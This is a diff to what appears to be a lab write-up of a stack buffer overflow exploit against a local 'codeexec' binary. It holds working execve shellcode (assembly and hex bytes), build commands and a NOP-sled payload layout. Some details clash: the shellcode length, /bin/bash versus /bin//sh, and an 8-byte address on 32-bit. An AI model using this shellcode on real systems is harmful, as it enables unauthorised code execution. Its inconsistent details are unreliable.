@@ -123,7 +123,7 @@ Fortunately, `cyclic` allows us to determine the exact offset of the overwritten
 by running `cyclic -o 0x66616162`, we discover that the return address is reached at offset **504**.
 
 To confirm this, let’s run the program with: `python3 -c 'print("A"*504 + "BBBB")' | ./codeexec`.\
-The program now crashes with the return address value: `0x42424242  # which corresponds to 'BBBB'`
+The program now crashes with the return address value: `0x42424242  # which corresponds to 'BBBB'`.\
 Success — we’ve confirmed the offset!
 
 ### (2) Crafting the payload
@@ -138,6 +138,41 @@ It increases the chances of a successful jump by allowing the return address to 
 3. The **return address**\
 this overwrites the original return address.
 It should point somewhere inside the NOP sled, to ensure the CPU will eventually reach the shellcode.
+
+In our case, we have 504 bytes available to store the **shellcode** + the **nop sled** that for the following shellcode is plenty of space given that our shellcode is only 24 bytes long.\
+Now we have written a simple shellcode that is the equivalent of run `execve("/bin/bash",{NULL},{NULL})` in a machine with intel_x86 architecture.
+
+```c
+section .text
+global _start
+_start:
+xor eax,eax // generating the null value in eax without using the byte 0x00 (bad character)
+cdq // extend the sign of the 32bit value in eax to 64bit value, storing the extension in %edx (argv[3] for execve)
+push eax // pushing the zero value onto the stack (string terminator for "/bin//sh")
+push 0x68732f2f // pushing "//sh" onto the stack (little endian)
+push 0x6e69622f // pushing "/bin" onto the stack (little endian)
+// At this point the stack contains:
+// 0x00000000
+// 0x68732f2f
+// 0x6e69622f <-- %esp
+mov ebx,esp // %ebx pointer to the string "/bin//sh" (argv[0] for execve) 
+mov ecx, eax // %ecx = 0x00000000 (argv[1] for execve)
+mov al,0x0b // setting %eax to the syscall number of "execve", copying 0x0b to %al overwrite only the last 8bits of %eax.
+int 80h // call the syscall
+```
+
+Let's proceed compiling the assembly file and extract the shellcode in hex format: 
+1. make the object file using: `nasm -f elf32 ./utils/codeexec_shellcode.asm -o ./obj/shellcode.o`
+2. make the binary file using: `ld -m elf_i386 ./obj/shellcode.o -o ./bin/shellcode`
+3. using the tool `bin2shell` extract the shellcode: `./bin2shell ./bin/shellcode`
+4. we finally get our shellcode: `\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\x0b\xcd\x80`
+
+Now that we have all we need, lets craft the payload:
+1. nop sled, length: $offset - len(shellcode) = 504B - 22B = 482B$
+2. shellcode, length: 22B
+3. return address that we get from the dump of the stack, length: 8B 
+
+
 
 
 
